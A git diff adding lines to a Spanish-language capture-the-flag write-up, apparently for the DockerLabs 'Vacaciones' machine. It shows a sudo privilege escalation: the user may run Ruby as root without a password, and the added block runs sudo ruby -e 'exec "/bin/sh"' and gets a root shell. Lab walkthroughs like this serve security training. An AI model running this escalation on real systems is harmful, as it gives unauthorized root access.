@@ -243,3 +243,9 @@ User juan may run the following commands on bce9d6585f7e:
     (ALL) NOPASSWD: /usr/bin/ruby
 ```
 Sabiendo que podemos ejecutar Ruby con permisos de administrador, podemos buscar en [GTFOBins](https://gtfobins.github.io/gtfobins/ruby/) alguna forma de establecer una shell remota, puesto que esta se ejecutará con los permisos del usuario que la haya lanzado. 
+![GTFOBins](https://github.com/JavieRR13/WriteUps/blob/242fbbf07762eec1c756edfa85ea9554b0ea935c/DockerLabs/Muy%20f%C3%A1cil/Vacaciones/Im%C3%A1genes/Vacaciones_GTFOBins.png)
+```ruby
+$ sudo ruby -e 'exec "/bin/sh"'
+# whoami
+root
+````
